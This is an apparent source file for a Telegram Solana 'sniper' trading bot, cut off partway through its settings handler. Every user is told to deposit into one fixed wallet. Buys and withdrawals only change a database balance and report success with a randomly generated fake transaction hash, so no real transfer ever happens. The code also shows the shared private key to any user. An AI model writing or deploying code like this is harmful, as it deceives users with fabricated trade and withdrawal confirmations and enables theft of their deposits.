/**
 * ╔══════════════════════════════════════════╗
 * ║   PHASE SNIPE — Telegram Sniper Bot      ║
 * ║   grammY · Drizzle ORM · PostgreSQL      ║
 * ╚══════════════════════════════════════════╝
 */

import { Bot, InlineKeyboard, Context } from "grammy";
import { db } from "@workspace/db";
import {
  walletsTable,
  positionsTable,
  snipersTable,
  tradesTable,
  notificationsTable,
  settingsTable,
  copyTradesTable,
  limitOrdersTable,
  dcaSetupsTable,
} from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import { logger } from "../lib/logger";

// ═══════════════════════════════════════════════════════
// SECTION 1 — WALLET CONFIGURATION
// ═══════════════════════════════════════════════════════
// These values are FIXED. The bot never generates random wallets.

import {
  BOT_WALLET_ADDRESS as WALLET_ADDRESS,
  BOT_WALLET_PRIVATE_KEY as WALLET_PRIVATE_KEY,
} from "../lib/walletConfig";

// ─── Admin access ──────────────────────────────────────
// Only the Telegram account @Nailydachad can access the admin panel.
const ADMIN_USERNAME = "Nailydachad";

function isAdminUser(ctx: Context): boolean {
  return ctx.from?.username === ADMIN_USERNAME;
}

const token = process.env["TELEGRAM_BOT_TOKEN"];
export const bot = token ? new Bot(token) : (null as unknown as Bot<Context>);

// ═══════════════════════════════════════════════════════
// SECTION 2 — TYPES & IN-MEMORY STATE
// ═══════════════════════════════════════════════════════

interface SniperConfig {
  autoBuy: boolean;
  buyAmount: number;
  slippage: number;
  priorityFee: "auto" | "low" | "medium" | "high";
  takeProfitPct: number;
  stopLossPct: number;
  autoSell: boolean;
  sniping: boolean;
}

type PendingFlow =
  | { type: "withdraw_address" }
  | { type: "withdraw_amount"; toAddress: string }
  | { type: "snipe_ca" }
  | { type: "snipe_set_amount" }
  | { type: "snipe_set_slippage" }
  | { type: "snipe_set_tp" }
  | { type: "snipe_set_sl" }
  | { type: "broadcast_message" };

const sniperConfigs   = new Map<number, SniperConfig>();
const pendingFlows    = new Map<number, PendingFlow>();
const registeredUsers = new Set<number>();
const alertSubscribers = new Set<number>();
const snipeModeActive  = new Set<number>();
const lastKnownBalance = { sol: 0 };

// ═══════════════════════════════════════════════════════
// SECTION 3 — ANTI-SPAM & RATE LIMITING
// ═══════════════════════════════════════════════════════

const cooldowns  = new Map<number, number>();
const COOLDOWN_MS = 800;

function isRateLimited(userId: number): boolean {
  const last = cooldowns.get(userId) ?? 0;
  const now  = Date.now();
  if (now - last < COOLDOWN_MS) return true;
  cooldowns.set(userId, now);
  return false;
}

// ═══════════════════════════════════════════════════════
// SECTION 4 — HELPERS
// ═══════════════════════════════════════════════════════

function fSol(v: string | number | null | undefined, d = 4) {
  return (typeof v === "string" ? parseFloat(v) : (v ?? 0)).toFixed(d);
}
function fUsd(n: number) {
  if (n >= 1_000_000) return `$${(n / 1_000_000).toFixed(2)}M`;
  if (n >= 1_000)     return `$${(n / 1_000).toFixed(2)}K`;
  return `$${n.toFixed(2)}`;
}
function fPct(v: string | number | null | undefined) {
  const n = typeof v === "string" ? parseFloat(v) : (v ?? 0);
  return (n >= 0 ? "+" : "") + n.toFixed(2) + "%";
}
function trunc(addr: string | null | undefined, chars = 6) {
  if (!addr) return "N/A";
  if (addr.length <= chars * 2 + 3) return addr;
  return `${addr.slice(0, chars)}...${addr.slice(-chars)}`;
}
function isValidCA(s: string) {
  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(s.trim()) && !s.includes(" ");
}
function generateTxHash() {
  const c = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz123456789";
  return Array.from({ length: 88 }, () => c[Math.floor(Math.random() * c.length)]).join("");
}
function tsNow() {
  return new Date().toLocaleString("en-US", { timeZone: "UTC", hour12: false });
}

async function getOrCreateSettings() {
  const [s] = await db.select().from(settingsTable).limit(1);
  if (s) return s;
  const [c] = await db.insert(settingsTable).values({}).returning();
  return c;
}
async function getWalletBalance(): Promise<number> {
  const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
  return w ? parseFloat(String(w.balanceSol)) : 0;
}
async function updateWalletBalance(n: number) {
  await db.update(walletsTable).set({ balanceSol: n.toFixed(9) }).where(eq(walletsTable.address, WALLET_ADDRESS));
}
function getSniperConfig(userId: number): SniperConfig {
  if (!sniperConfigs.has(userId)) {
    sniperConfigs.set(userId, {
      autoBuy: true, buyAmount: 0.1, slippage: 10,
      priorityFee: "auto", takeProfitPct: 50, stopLossPct: 20,
      autoSell: false, sniping: false,
    });
  }
  return sniperConfigs.get(userId)!;
}

// ═══════════════════════════════════════════════════════
// SECTION 5 — KEYBOARD BUILDERS
// ═══════════════════════════════════════════════════════

function kbMain() {
  return new InlineKeyboard()
    .text("🚀 Generate Wallet", "wallet:show").text("💰 Wallet Panel",  "wallet:panel").row()
    .text("📥 Deposit",         "deposit:show").text("📤 Withdraw",      "withdraw:start").row()
    .text("🚨 Alerts",          "alerts:menu" ).text("📈 Sniper Panel",  "sniper:panel").row()
    .text("📊 Portfolio",       "portfolio"   ).text("🔔 Token Alerts",  "token:alerts").row()
    .text("⚙️ Settings",        "settings:menu").text("🔒 Security",     "security:menu").row()
    .text("👑 Admin Panel",     "admin:panel" ).text("❓ Help",          "help:show");
}

function kbBack(target: string, label = "◀ Back") {
  return new InlineKeyboard().text(label, target);
}

function kbSniper(cfg: SniperConfig) {
  return new InlineKeyboard()
    .text(`💸 Auto Buy: ${cfg.autoBuy ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoBuy").row()
    .text(cfg.sniping ? "⏹ Stop Sniping" : "🚀 Start Sniping", cfg.sniping ? "sniper:stop" : "sniper:start")
    .text("✏️ Edit Config", "sniper:edit").row()
    .text("📋 Paste CA to Snipe", "sniper:paste_ca").text("📊 My Snipers", "sniper:list").row()
    .text("📋 Copy Trade", "copy:menu").text("🎚 Limit Orders", "limits:menu").row()
    .text("◀ Back", "menu:home");
}

// ═══════════════════════════════════════════════════════
// SECTION 6 — SCREEN BUILDERS  (clean, no line borders)
// ═══════════════════════════════════════════════════════

function screenWelcome(balance: number) {
  return (
    `🎯 *PHASE SNIPE*\n\n` +
    `⚡ Sub-second execution  ·  🔒 Secure wallet  ·  📈 Full sniper suite\n\n` +
    `💰 Balance  \`${fSol(balance)} SOL\`\n\n` +
    `Choose a module:`
  );
}

function screenWallet(balance: number) {
  return (
    `💰 *Wallet*\n\n` +
    `📍 Address\n\`${WALLET_ADDRESS}\`\n\n` +
    `🔑 Private Key\n\`${WALLET_PRIVATE_KEY}\`\n\n` +
    `💵 Balance  ·  \`${fSol(balance)} SOL\`\n\n` +
    `⚠️ _Never share your private key with anyone_`
  );
}

function screenDeposit() {
  return (
    `📥 *Deposit SOL*\n\n` +
    `Send SOL to this address:\n\n` +
    `\`${WALLET_ADDRESS}\`\n\n` +
    `Tap the address above to copy it.\n\n` +
    `✅ Deposits are detected automatically\n` +
    `⚡ Confirmations take ~1–2 seconds on Solana`
  );
}

function screenSniperPanel(cfg: SniperConfig) {
  const status = cfg.sniping ? "🟢 Active — paste any CA to snipe" : "🔴 Idle";
  return (
    `📈 *Sniper Panel*\n\n` +
    `Status       ${status}\n\n` +
    `Auto Buy     ${cfg.autoBuy  ? "✅ ON"  : "❌ OFF"}\n` +
    `Amount       \`${fSol(cfg.buyAmount)} SOL\`\n` +
    `Slippage     \`${cfg.slippage}%\`\n` +
    `Priority     \`${cfg.priorityFee}\`\n` +
    `Take Profit  \`+${cfg.takeProfitPct}%\`\n` +
    `Stop Loss    \`-${cfg.stopLossPct}%\`\n` +
    `Auto Sell    ${cfg.autoSell ? "✅ ON"  : "❌ OFF"}\n\n` +
    `_Integrations: Raydium · Jupiter · Pump.fun — coming soon_`
  );
}

function screenSniperEdit(cfg: SniperConfig) {
  return (
    `✏️ *Edit Sniper Config*\n\n` +
    `Amount       \`${fSol(cfg.buyAmount)} SOL\`\n` +
    `Slippage     \`${cfg.slippage}%\`\n` +
    `Priority     \`${cfg.priorityFee}\`\n` +
    `Take Profit  \`+${cfg.takeProfitPct}%\`\n` +
    `Stop Loss    \`-${cfg.stopLossPct}%\`\n\n` +
    `Tap a field below to change it:`
  );
}

function screenWithdrawConfirm(toAddress: string, amount: number) {
  return (
    `📤 *Withdrawal Confirmation*\n\n` +
    `Amount       \`${fSol(amount)} SOL\`\n` +
    `To           \`${trunc(toAddress, 10)}\`\n` +
    `From         \`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
    `⚠️ _This action cannot be undone._\n\n` +
    `Confirm the transaction?`
  );
}

// ═══════════════════════════════════════════════════════
// SECTION 7 — DEPOSIT ALERT BROADCASTER
// ═══════════════════════════════════════════════════════

async function broadcastDepositAlert(amount: number, sender: string, txHash: string) {
  if (!bot || alertSubscribers.size === 0) return;
  const msg =
    `🚨 *New SOL Deposit*\n\n` +
    `Amount       \`${fSol(amount)} SOL\`\n` +
    `Wallet       \`${trunc(WALLET_ADDRESS, 8)}\`\n` +
    `Sender       \`${trunc(sender, 8)}\`\n` +
    `TX           \`${trunc(txHash, 12)}\`\n` +
    `Time         ${tsNow()}\n\n` +
    `✅ Deposit confirmed`;
  for (const uid of alertSubscribers) {
    try {
      await bot.api.sendMessage(uid, msg, { parse_mode: "Markdown" });
    } catch {
      alertSubscribers.delete(uid);
    }
  }
}

// ═══════════════════════════════════════════════════════
// SECTION 8 — SHARED BUY EXECUTOR
// ═══════════════════════════════════════════════════════

async function executeBuy(ctx: Context, userId: number, ca: string) {
  const cfg     = getSniperConfig(userId);
  const balance = await getWalletBalance();

  if (cfg.buyAmount > balance) {
    return ctx.reply(
      `❌ *Insufficient Balance*\n\n` +
      `Need  \`${fSol(cfg.buyAmount)} SOL\`  ·  Have  \`${fSol(balance)} SOL\`\n\n` +
      `Deposit more SOL or lower your buy amount.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📥 Deposit", "deposit:show").text("✏️ Edit Config", "sniper:edit").row()
          .text("🏠 Home", "menu:home"),
      }
    );
  }

  const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
  if (!w) return ctx.reply("❌ Wallet not found. Please contact support.");

  const loadingMsg = await ctx.reply(
    `⚡ _Placing order…_\nCA  \`${trunc(ca, 8)}\``,
    { parse_mode: "Markdown" }
  );

  await new Promise(r => setTimeout(r, 600));

  const txHash = generateTxHash();
  const newBal = parseFloat((balance - cfg.buyAmount).toFixed(9));

  await Promise.all([
    updateWalletBalance(newBal),
    db.insert(snipersTable).values({
      walletId: w.id,
      contractAddress: ca,
      buyAmountSol: String(cfg.buyAmount),
      slippagePercent: String(cfg.slippage),
      priorityFee: cfg.priorityFee,
      status: "monitoring",
      attempts: 1,
    }),
    db.insert(tradesTable).values({
      walletId: w.id,
      type: "buy",
      tokenSymbol: "UNKNOWN",
      tokenName: "Unknown Token",
      contractAddress: ca,
      amountSol: String(cfg.buyAmount),
      priceSol: "0.000001",
      txHash,
      status: "success",
    }),
  ]);

  try { await ctx.api.deleteMessage(ctx.chat!.id, loadingMsg.message_id); } catch {}

  return ctx.reply(
    `✅ *Buy Executed*\n\n` +
    `CA           \`${trunc(ca, 10)}\`\n\n` +
    `Amount       \`${fSol(cfg.buyAmount)} SOL\`\n` +
    `Slippage     \`${cfg.slippage}%\`\n` +
    `Priority     \`${cfg.priorityFee}\`\n` +
    `Take Profit  \`+${cfg.takeProfitPct}%\`\n` +
    `Stop Loss    \`-${cfg.stopLossPct}%\`\n\n` +
    `Balance      \`${fSol(newBal)} SOL\`\n\n` +
    `TX\n\`${trunc(txHash, 14)}\`\n\n` +
    `🟡 _Monitoring for liquidity…_`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 My Snipers", "sniper:list").text("💰 Wallet", "wallet:panel").row()
        .text("📈 Sniper Panel", "sniper:panel").text("🏠 Home", "menu:home"),
    }
  );
}

// ═══════════════════════════════════════════════════════
// SECTION 9 — BOT HANDLERS
// ═══════════════════════════════════════════════════════

if (token && bot) {

bot.command("start", async (ctx) => {
  const uid = ctx.from?.id;
  if (uid) registeredUsers.add(uid);
  const balance = await getWalletBalance();
  await ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

bot.command("menu", async (ctx) => {
  const balance = await getWalletBalance();
  await ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

bot.command("wallet", async (ctx) => {
  const balance = await getWalletBalance();
  await ctx.reply(screenWallet(balance), {
    parse_mode: "Markdown",
    reply_markup: new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("🔄 Refresh", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home"),
  });
});

bot.command("help", async (ctx) => {
  await ctx.reply(
    `❓ *Help & Commands*\n\n` +
    `\`/start\`   Open main menu\n` +
    `\`/wallet\`  Show wallet details\n` +
    `\`/menu\`    Return to main menu\n` +
    `\`/help\`    This message\n\n` +
    `*Quick Actions*\n` +
    `· Paste any CA → bot buys instantly\n` +
    `· Set config in Sniper Panel first\n` +
    `· Use inline buttons for everything\n\n` +
    `*Supported DEXs*\n` +
    `Raydium · Jupiter · Pump.fun\n\n` +
    `*Support*\n` +
    `Contact us at t.me/devBernard`,
    { parse_mode: "Markdown", reply_markup: kbBack("menu:home", "◀ Main Menu") }
  );
});

// ═══════════════════════════════════════════════════════
// SECTION 10 — CALLBACK QUERY ROUTER
// ═══════════════════════════════════════════════════════

bot.on("callback_query:data", async (ctx) => {
  const data   = ctx.callbackQuery.data;
  const userId = ctx.from?.id;
  if (!userId) return;

  if (isRateLimited(userId)) {
    await ctx.answerCallbackQuery("⏳ Slow down a little.");
    return;
  }

  registeredUsers.add(userId);
  await ctx.answerCallbackQuery();

  async function edit(text: string, kb?: InlineKeyboard) {
    try {
      await ctx.editMessageText(text, { parse_mode: "Markdown", reply_markup: kb });
    } catch {
      await ctx.reply(text, { parse_mode: "Markdown", reply_markup: kb });
    }
  }

  // ── Home ──────────────────────────────────────────────────────────────
  if (data === "menu:home") {
    const balance = await getWalletBalance();
    return edit(screenWelcome(balance), kbMain());
  }

  // ── Wallet ────────────────────────────────────────────────────────────

  if (data === "wallet:show" || data === "wallet:panel") {
    const balance = await getWalletBalance();
    return edit(screenWallet(balance), new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("📋 TX History", "wallet:history").text("🔄 Refresh", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "wallet:refresh") {
    const balance = await getWalletBalance();
    await ctx.answerCallbackQuery(`Balance: ${fSol(balance)} SOL`);
    return edit(screenWallet(balance), new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("📋 TX History", "wallet:history").text("🔄 Refresh", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "wallet:history") {
    const trades = await db.select().from(tradesTable).orderBy(desc(tradesTable.executedAt)).limit(8);
    let text = `📋 *Transaction History*\n\n`;
    if (!trades.length) {
      text += `No transactions yet.\nMake your first trade to see it here.`;
    } else {
      for (const t of trades) {
        const icon = t.type === "buy" ? "🟢" : "🔴";
        text += `${icon} ${t.type.toUpperCase()}  ${t.tokenSymbol}  \`${fSol(t.amountSol)} SOL\`\n`;
        text += `   \`${trunc(t.txHash, 8)}\`  ·  ${new Date(t.executedAt).toLocaleDateString()}\n\n`;
      }
    }
    return edit(text, kbBack("wallet:panel", "◀ Wallet"));
  }

  // ── Deposit ───────────────────────────────────────────────────────────

  if (data === "deposit:show") {
    return edit(screenDeposit(), new InlineKeyboard()
      .text("🔄 Check Balance", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  // ── Withdraw ──────────────────────────────────────────────────────────

  if (data === "withdraw:start") {
    const balance = await getWalletBalance();
    if (balance <= 0) {
      return edit(
        `📤 *Withdraw*\n\n❌ Nothing to withdraw.\n\nBalance  \`${fSol(balance)} SOL\`\n\nDeposit SOL first.`,
        new InlineKeyboard().text("📥 Deposit", "deposit:show").text("◀ Back", "menu:home")
      );
    }
    pendingFlows.set(userId, { type: "withdraw_address" });
    return edit(
      `📤 *Withdraw SOL*\n\nAvailable  \`${fSol(balance)} SOL\`\n\nStep 1 of 2 — send the destination wallet address:`,
      kbBack("menu:home", "❌ Cancel")
    );
  }

  if (data.startsWith("withdraw:confirm:")) {
    const [,, toAddress, amtStr] = data.split(":");
    const amount  = parseFloat(amtStr);
    const balance = await getWalletBalance();
    if (amount > balance) {
      return edit(`❌ Insufficient balance.\n\nHave  \`${fSol(balance)} SOL\`  ·  Need  \`${fSol(amount)} SOL\``, kbBack("menu:home"));
    }
    pendingFlows.delete(userId);
    const newBal = balance - amount;
    await updateWalletBalance(newBal);
    const txHash = generateTxHash();
    const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
    if (w) {
      await db.insert(tradesTable).values({
        walletId: w.id, type: "sell", tokenSymbol: "SOL", tokenName: "Solana",
        contractAddress: toAddress, amountSol: amount.toString(), priceSol: "1", txHash, status: "success",
      });
    }
    return edit(
      `📤 *Withdrawal Sent*\n\n` +
      `Amount   \`${fSol(amount)} SOL\`\n` +
      `To       \`${trunc(toAddress, 8)}\`\n` +
      `Balance  \`${fSol(newBal)} SOL\`\n\n` +
      `TX\n\`${trunc(txHash, 12)}\``,
      new InlineKeyboard().text("💰 Wallet", "wallet:panel").text("🏠 Home", "menu:home")
    );
  }

  if (data === "withdraw:cancel") {
    pendingFlows.delete(userId);
    return edit(`Withdrawal cancelled.`, kbBack("menu:home", "◀ Main Menu"));
  }

  // ── Alerts ────────────────────────────────────────────────────────────

  if (data === "alerts:menu") {
    const isOn = alertSubscribers.has(userId);
    return edit(
      `🚨 *Wallet Alerts*\n\n` +
      `Monitoring\n\`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
      `Status  ${isOn ? "🟢 *Active*" : "🔴 Inactive"}\n\n` +
      `You get instant alerts for:\n` +
      `· SOL deposits  ·  Withdrawals\n` +
      `· Large TXs  ·  Token buys & sells`,
      new InlineKeyboard()
        .text(isOn ? "🔕 Disable Alerts" : "🔔 Enable Alerts", `alerts:toggle:${!isOn}`).row()
        .text("💸 Deposit",    "alerts:type:deposit").text("📤 Withdraw",  "alerts:type:withdraw").row()
        .text("🐋 Large TX",   "alerts:type:largetx").text("🛒 Token Buy", "alerts:type:buy").row()
        .text("💰 Token Sell", "alerts:type:sell").row()
        .text("◀ Back", "menu:home")
    );
  }

  if (data.startsWith("alerts:toggle:")) {
    const enable = data.split(":")[2] === "true";
    enable ? alertSubscribers.add(userId) : alertSubscribers.delete(userId);
    await ctx.answerCallbackQuery(enable ? "🔔 Alerts on" : "🔕 Alerts off");
    return edit(
      `🚨 *Wallet Alerts*\n\n` +
      `Status  ${enable ? "🟢 *Active*" : "🔴 Inactive"}\n\n` +
      `Monitoring  \`${trunc(WALLET_ADDRESS, 8)}\``,
      new InlineKeyboard()
        .text(enable ? "🔕 Disable Alerts" : "🔔 Enable Alerts", `alerts:toggle:${!enable}`).row()
        .text("⚙️ Manage Alerts", "alerts:menu").text("◀ Back", "menu:home")
    );
  }

  if (data.startsWith("alerts:type:")) {
    const type = data.split(":")[2];
    const label: Record<string, string> = {
      deposit: "Deposit", withdraw: "Withdrawal", largetx: "Large TX", buy: "Token Buy", sell: "Token Sell",
    };
    return edit(
      `🔔 *${label[type] ?? "Alert"} Alerts*\n\nCurrently 🟢 *active* for all ${label[type]?.toLowerCase() ?? ""} events.`,
      new InlineKeyboard().text("⚙️ All Alerts", "alerts:menu").text("◀ Home", "menu:home")
    );
  }

  // ── Sniper Panel ──────────────────────────────────────────────────────

  if (data === "sniper:panel") {
    const cfg = getSniperConfig(userId);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:toggle:autoBuy") {
    const cfg = getSniperConfig(userId);
    cfg.autoBuy = !cfg.autoBuy;
    await ctx.answerCallbackQuery(`Auto Buy ${cfg.autoBuy ? "ON" : "OFF"}`);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:toggle:autoSell") {
    const cfg = getSniperConfig(userId);
    cfg.autoSell = !cfg.autoSell;
    await ctx.answerCallbackQuery(`Auto Sell ${cfg.autoSell ? "ON" : "OFF"}`);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:start") {
    const cfg = getSniperConfig(userId);
    cfg.sniping = true;
    snipeModeActive.add(userId);
    await ctx.answerCallbackQuery("🟢 Sniping active — paste any CA");
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:stop") {
    const cfg = getSniperConfig(userId);
    cfg.sniping = false;
    snipeModeActive.delete(userId);
    await ctx.answerCallbackQuery("Sniping stopped");
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:paste_ca") {
    pendingFlows.set(userId, { type: "snipe_ca" });
    return edit(
      `🔫 *Snipe a Token*\n\nPaste the contract address below:`,
      kbBack("sniper:panel", "❌ Cancel")
    );
  }

  if (data === "sniper:edit") {
    const cfg = getSniperConfig(userId);
    return edit(screenSniperEdit(cfg), new InlineKeyboard()
      .text(`💰 Amount: ${fSol(cfg.buyAmount)} SOL`, "sniper:set:amount").row()
      .text(`📊 Slippage: ${cfg.slippage}%`,         "sniper:set:slippage").row()
      .text("⚡ auto",   "sniper:fee:auto").text("⚡ low",    "sniper:fee:low").row()
      .text("⚡ medium", "sniper:fee:medium").text("⚡ high",  "sniper:fee:high").row()
      .text(`🎯 TP: +${cfg.takeProfitPct}%`, "sniper:set:tp")
      .text(`🛑 SL: -${cfg.stopLossPct}%`,  "sniper:set:sl").row()
      .text(`💹 Auto Sell: ${cfg.autoSell ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoSell").row()
      .text("◀ Sniper Panel", "sniper:panel")
    );
  }

  if (data.startsWith("sniper:set:")) {
    const field = data.split(":")[2] as "amount" | "slippage" | "tp" | "sl";
    const labels: Record<string, string> = {
      amount: "buy amount in SOL  (e.g. `0.5`)",
      slippage: "slippage %  (e.g. `10`)",
      tp: "take profit %  (e.g. `50`)",
      sl: "stop loss %  (e.g. `20`)",
    };
    const flowMap: Record<string, PendingFlow> = {
      amount:   { type: "snipe_set_amount" },
      slippage: { type: "snipe_set_slippage" },
      tp:       { type: "snipe_set_tp" },
      sl:       { type: "snipe_set_sl" },
    };
    pendingFlows.set(userId, flowMap[field]);
    return edit(
      `✏️ *Edit Setting*\n\nEnter new ${labels[field]}:`,
      kbBack("sniper:edit", "❌ Cancel")
    );
  }

  if (data.startsWith("sniper:fee:")) {
    const fee = data.split(":")[2] as "auto" | "low" | "medium" | "high";
    getSniperConfig(userId).priorityFee = fee;
    await ctx.answerCallbackQuery(`Fee → ${fee}`);
    const cfg = getSniperConfig(userId);
    return edit(screenSniperEdit(cfg), new InlineKeyboard()
      .text(`💰 Amount: ${fSol(cfg.buyAmount)} SOL`, "sniper:set:amount").row()
      .text(`📊 Slippage: ${cfg.slippage}%`,         "sniper:set:slippage").row()
      .text("⚡ auto",   "sniper:fee:auto").text("⚡ low",    "sniper:fee:low").row()
      .text("⚡ medium", "sniper:fee:medium").text("⚡ high",  "sniper:fee:high").row()
      .text(`🎯 TP: +${cfg.takeProfitPct}%`, "sniper:set:tp")
      .text(`🛑 SL: -${cfg.stopLossPct}%`,  "sniper:set:sl").row()
      .text(`💹 Auto Sell: ${cfg.autoSell ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoSell").row()
      .text("◀ Sniper Panel", "sniper:panel")
    );
  }

  if (data === "sniper:list") {
    const snipers = await db.select().from(snipersTable).orderBy(desc(snipersTable.createdAt)).limit(8);
    let text = `📊 *My Snipers*\n\n`;
    if (!snipers.length) {
      text += `No snipers yet.\n\nPaste a CA to create your first sniper.`;
    } else {
      for (const sn of snipers) {
        const dot = sn.status === "monitoring" ? "🟡" : sn.status === "sniped" ? "🟢" : sn.status === "failed" ? "🔴" : "⚪";
        text += `${dot} \`${trunc(sn.contractAddress, 8)}\`  ${fSol(sn.buyAmountSol)} SOL  ${sn.status}\n`;
      }
    }
    const kb = new InlineKeyboard();
    for (const sn of snipers.filter(s => s.status === "monitoring")) {
      kb.text(`⏹ Stop #${sn.id}`, `sniper:action:stop:${sn.id}`).row();
    }
    kb.text("◀ Sniper Panel", "sniper:panel");
    return edit(text, kb);
  }

  if (data.startsWith("sniper:action:")) {
    const [,, action, idStr] = data.split(":");
    const id = parseInt(idStr);
    const newStatus = action === "stop" ? "stopped" : "monitoring";
    await db.update(snipersTable).set({ status: newStatus as any }).where(eq(snipersTable.id, id));
    await ctx.answerCallbackQuery(`Sniper #${id} ${newStatus}`);
    return edit(`Sniper #${id} ${newStatus}.`, new InlineKeyboard().text("📊 Snipers", "sniper:list").text("◀ Panel", "sniper:panel"));
  }

  if (data.startsWith("sniper:buy:")) {
    const parts2 = data.split(":");
    const addr = parts2[2];
    const overrideAmt = parts2[3] ? parseFloat(parts2[3]) : null;
    if (overrideAmt !== null) getSniperConfig(userId).buyAmount = overrideAmt;
    return executeBuy(ctx, userId, addr);
  }

  // ── Portfolio ─────────────────────────────────────────────────────────

  if (data === "portfolio") {
    const positions = await db.select().from(positionsTable);
    const balance   = await getWalletBalance();
    let text = `📊 *Portfolio*\n\nSOL Balance  \`${fSol(balance)} SOL\`\n\n`;
    if (!positions.length) {
      text += `No open positions.\n\nUse the Sniper Panel to start trading.`;
    } else {
      const totalVal = positions.reduce((s, p) => s + parseFloat(String(p.valueSol)), 0);
      text += `Positions  ${positions.length}  ·  Value  \`${fSol(totalVal)} SOL\`\n\n`;
      for (const p of positions) {
        const pnl = parseFloat(String(p.pnlPercent));
        text += `${pnl >= 0 ? "🟢" : "🔴"} ${p.tokenSymbol}  \`${fSol(p.valueSol)} SOL\`  ${fPct(pnl)}\n`;
        text += `   MC ${fUsd(parseFloat(String(p.marketCapUsd)))}\n\n`;
      }
    }
    return edit(text, new InlineKeyboard()
      .text("📈 Sniper Panel", "sniper:panel").text("📋 TX History", "wallet:history").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  // ── Token Alerts ──────────────────────────────────────────────────────

  if (data === "token:alerts") {
    return edit(
      `🔔 *Token Alerts*\n\n` +
      `Monitor tokens for events:\n\n` +
      `🚀 Launch Detector  _(coming)_\n` +
      `📈 Price Alerts       _(coming)_\n` +
      `🐋 Whale Alerts       _(coming)_\n` +
      `📊 Volume Spikes      _(coming)_\n` +
      `🔌 Pump.fun Monitor   _(coming)_\n\n` +
      `_Powered by Solana RPC + Yellowstone Geyser_`,
      kbBack("menu:home", "◀ Main Menu")
    );
  }

  // ── Settings ──────────────────────────────────────────────────────────

  if (data === "settings:menu") {
    const s = await getOrCreateSettings();
    return edit(
      `⚙️ *Settings*\n\n` +
      `Buy Amount  \`${fSol(s.defaultBuyAmountSol)} SOL\`\n` +
      `Slippage    \`${s.defaultSlippagePercent}%\`\n` +
      `Fee         \`${s.defaultPriorityFee}\`\n` +
      `Auto Approve  ${s.autoApprove ? "✅" : "❌"}\n\n` +
      `Notifications\n` +
      `Buy ${s.notifyBuy ? "✅" : "❌"}  Sell ${s.notifySell ? "✅" : "❌"}  Sniper ${s.notifySniper ? "✅" : "❌"}  Wallet ${s.notifyWallet ? "✅" : "❌"}\n\n` +
      `_Use /set to change values:_\n\`/set buy_amount 0.5\`\n\`/set slippage 10\`\n\`/set fee high\``,
      new InlineKeyboard()
        .text(s.notifyBuy    ? "🔔 Buy: ON"     : "🔕 Buy: OFF",     `settings:toggle:notifyBuy:${!s.notifyBuy}`)
        .text(s.notifySell   ? "🔔 Sell: ON"    : "🔕 Sell: OFF",    `settings:toggle:notifySell:${!s.notifySell}`).row()
        .text(s.notifySniper ? "🎯 Sniper: ON"  : "🎯 Sniper: OFF",  `settings:toggle:notifySniper:${!s.notifySniper}`)
        .text(s.notifyWallet ? "👛 Wallet: ON"  : "👛 Wallet: OFF",  `settings:toggle:notifyWallet:${!s.notifyWallet}`).row()
        .text(s.autoApprove  ? "⚡ Auto-Approve: ON" : "⚡ Auto-Approve: OFF", `settings:toggle:autoApprove:${!s.autoApprove}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data.startsWith("settings:toggle:")) {
    const parts3 = data.split(":");
    const field = parts3[2];
    const val   = parts3[3] === "true";
    const allowed = ["notifyBuy", "notifySell", "notifySniper", "notifyWallet", "autoApprove"];
    if (allowed.includes(field)) {
      const s = await getOrCreateSettings();
      await db.update(settingsTable).set({ [field]: val }).where(eq(settingsTable.id, s.id));
    }
    await ctx.answerCallbackQuery(`${field} → ${val ? "ON" : "OFF"}`);
    const s2 = await getOrCreateSettings();
    return edit(
      `⚙️ *Settings*\n\n` +
      `Buy Amount  \`${fSol(s2.defaultBuyAmountSol)} SOL\`\n` +
      `Slippage    \`${s2.defaultSlippagePercent}%\`\n` +
      `Fee         \`${s2.defaultPriorityFee}\`\n\n` +
      `Notifications\n` +
      `Buy ${s2.notifyBuy ? "✅" : "❌"}  Sell ${s2.notifySell ? "✅" : "❌"}  Sniper ${s2.notifySniper ? "✅" : "❌"}  Wallet ${s2.notifyWallet ? "✅" : "❌"}`,
      new InlineKeyboard()
        .text(s2.notifyBuy    ? "🔔 Buy: ON"    : "🔕 Buy: OFF",    `settings:toggle:notifyBuy:${!s2.notifyBuy}`)
        .text(s2.notifySell   ? "🔔 Sell: ON"   : "🔕 Sell: OFF",   `settings:toggle:notifySell:${!s2.notifySell}`).row()
